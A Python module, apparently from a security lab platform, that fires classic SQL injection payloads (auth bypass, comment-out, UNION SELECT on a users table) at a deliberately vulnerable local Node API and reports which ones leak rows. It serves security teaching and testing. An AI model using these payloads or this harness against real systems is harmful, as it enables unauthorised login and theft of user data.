"""SQL Injection demonstrator.

Sends a series of classic SQLi payloads to the vulnerable Node API's /api/user
endpoint and reports which ones alter the query's behavior (auth bypass / data
dump). Everything targets the local lab container.
"""

from __future__ import annotations

import asyncio

import httpx

from .base import AttackModuleBase, Emit, register

PAYLOADS = [
    ("baseline", "admin"),
    ("auth bypass", "admin' OR '1'='1"),
    ("comment out", "admin'--"),
    ("union dump", "x' UNION SELECT * FROM users--"),
    ("always true", "' OR 1=1--"),
]


@register
class SqlInjection(AttackModuleBase):
    id = "sql_injection"
    name = "SQL Injection Demonstrator"
    description = "Injects classic SQLi payloads to bypass auth and dump data."
    default_target = "vuln-node-api"
    mitre = "T1190"
    params_schema = {"port": {"type": "int", "default": 3001, "label": "Target port"}}

    async def run(self, target: str, params: dict, emit: Emit) -> dict:
        port = int(params.get("port", 3001))
        base = f"http://{target}:{port}"
        findings = []
        baseline_count = None

        await emit("info", f"Targeting {base}/api/user", 5)
        async with httpx.AsyncClient(timeout=10) as client:
            total = len(PAYLOADS)
            for i, (label, payload) in enumerate(PAYLOADS):
                progress = int(10 + (i / total) * 80)
                await emit("info", f"Sending payload [{label}]: {payload!r}", progress,
                           {"payload": payload})
                try:
                    r = await client.get(f"{base}/api/user", params={"username": payload})
                    body = r.json()
                except Exception as exc:
                    await emit("error", f"Request failed: {exc}", progress)
                    continue

                count = body.get("count", 0)
                if label == "baseline":
                    baseline_count = count
                    await emit("info", f"Baseline returned {count} row(s).", progress)
                    continue

                leaked = count > (baseline_count or 1)
                if leaked or body.get("injection_detected"):
                    await emit("success",
                               f"Injection succeeded [{label}] -> {count} rows leaked!",
                               progress,
                               {"rows": count, "query": body.get("executed_query")})
                    findings.append({"label": label, "payload": payload, "rows": count})
                else:
                    await emit("info", f"Payload [{label}] had no effect.", progress)
                await asyncio.sleep(0.4)

        success = len(findings) > 0
        await emit("success" if success else "warn",
                   f"SQLi complete: {len(findings)} working payload(s).", 100,
                   {"findings": findings})
        return {
            "success": success,
            "working_payloads": findings,
            "baseline_rows": baseline_count,
            "endpoint": f"{base}/api/user",
        }
